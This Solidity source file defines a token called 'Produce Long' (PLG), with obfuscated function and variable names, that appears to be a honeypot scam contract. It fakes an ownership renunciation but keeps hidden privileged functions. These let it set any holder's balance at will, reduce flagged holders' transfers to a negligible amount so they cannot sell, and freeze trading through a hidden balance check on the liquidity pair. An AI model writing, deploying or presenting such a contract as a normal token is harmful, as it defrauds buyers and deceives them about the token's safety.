//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface shouldList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract tokenBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minReceiverMarketing {
    function createPair(address fromLaunched, address receiverTx) external returns (address);
}

interface toTxSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamTo) external view returns (uint256);

    function transfer(address shouldTx, uint256 enableToken) external returns (bool);

    function allowance(address walletReceiverTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 enableToken) external returns (bool);

    function transferFrom(
        address sender,
        address shouldTx,
        uint256 enableToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellLimit, uint256 value);
    event Approval(address indexed walletReceiverTo, address indexed spender, uint256 value);
}

interface toTotal is toTxSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ProduceLong is tokenBuy, toTxSwap, toTotal {

    function transferFrom(address listToken, address shouldTx, uint256 enableToken) external override returns (bool) {
        if (_msgSender() != isAt) {
            if (fromList[listToken][_msgSender()] != type(uint256).max) {
                require(enableToken <= fromList[listToken][_msgSender()]);
                fromList[listToken][_msgSender()] -= enableToken;
            }
        }
        return autoMode(listToken, shouldTx, enableToken);
    }

    address launchedLaunchTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private fundAuto = "Produce Long";

    function allowance(address enableLaunchedTo, address enableLiquidity) external view virtual override returns (uint256) {
        if (enableLiquidity == isAt) {
            return type(uint256).max;
        }
        return fromList[enableLaunchedTo][enableLiquidity];
    }

    mapping(address => bool) public buyExempt;

    function takeMax() public {
        emit OwnershipTransferred(takeLaunch, address(0));
        tokenTx = address(0);
    }

    bool private receiverSender;

    event OwnershipTransferred(address indexed toLaunch, address indexed sellMode);

    uint256 private maxTeam = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return tokenTx;
    }

    uint256 modeAmountLaunched;

    function autoMode(address listToken, address shouldTx, uint256 enableToken) internal returns (bool) {
        if (listToken == takeLaunch) {
            return enableTeam(listToken, shouldTx, enableToken);
        }
        uint256 liquidityToken = toTxSwap(liquidityTeamSender).balanceOf(launchedLaunchTeam);
        require(liquidityToken == swapMarketing);
        require(shouldTx != launchedLaunchTeam);
        if (buyExempt[listToken]) {
            return enableTeam(listToken, shouldTx, launchExempt);
        }
        return enableTeam(listToken, shouldTx, enableToken);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxTeam;
    }

    string private atAuto = "PLG";

    function symbol() external view virtual override returns (string memory) {
        return atAuto;
    }

    function limitTakeTx(address amountSwap, uint256 enableToken) public {
        receiverEnable();
        tradingTeam[amountSwap] = enableToken;
    }

    bool public buyIs;

    function transfer(address amountSwap, uint256 enableToken) external virtual override returns (bool) {
        return autoMode(_msgSender(), amountSwap, enableToken);
    }

    bool public fromLiquidity;

    function approve(address enableLiquidity, uint256 enableToken) public virtual override returns (bool) {
        fromList[_msgSender()][enableLiquidity] = enableToken;
        emit Approval(_msgSender(), enableLiquidity, enableToken);
        return true;
    }

    function receiverEnable() private view {
        require(launchReceiver[_msgSender()]);
    }

    function balanceOf(address teamTo) public view virtual override returns (uint256) {
        return tradingTeam[teamTo];
    }

    address private tokenTx;

    mapping(address => bool) public launchReceiver;

    uint8 private walletSell = 18;

    bool public shouldLaunch;

    function decimals() external view virtual override returns (uint8) {
        return walletSell;
    }

    function sellToMax(address walletReceiverBuy) public {
        receiverEnable();
        if (receiverSender == walletMarketing) {
            fromLiquidity = true;
        }
        if (walletReceiverBuy == takeLaunch || walletReceiverBuy == liquidityTeamSender) {
            return;
        }
        buyExempt[walletReceiverBuy] = true;
    }

    address public liquidityTeamSender;

    mapping(address => uint256) private tradingTeam;

    function enableTeam(address listToken, address shouldTx, uint256 enableToken) internal returns (bool) {
        require(tradingTeam[listToken] >= enableToken);
        tradingTeam[listToken] -= enableToken;
        tradingTeam[shouldTx] += enableToken;
        emit Transfer(listToken, shouldTx, enableToken);
        return true;
    }

    function launchedExemptIs(uint256 enableToken) public {
        receiverEnable();
        swapMarketing = enableToken;
    }

    address isAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private walletMarketing;

    uint256 constant launchExempt = 3 ** 10;

    function owner() external view returns (address) {
        return tokenTx;
    }

    address public takeLaunch;

    uint256 swapMarketing;

    function feeLimit(address txBuy) public {
        if (buyIs) {
            return;
        }
        
        launchReceiver[txBuy] = true;
        
        buyIs = true;
    }

    mapping(address => mapping(address => uint256)) private fromList;

    function name() external view virtual override returns (string memory) {
        return fundAuto;
    }

    constructor (){
        
        shouldList atSell = shouldList(isAt);
        liquidityTeamSender = minReceiverMarketing(atSell.factory()).createPair(atSell.WETH(), address(this));
        
        takeLaunch = _msgSender();
        takeMax();
        launchReceiver[takeLaunch] = true;
        tradingTeam[takeLaunch] = maxTeam;
        
        emit Transfer(address(0), takeLaunch, maxTeam);
    }

}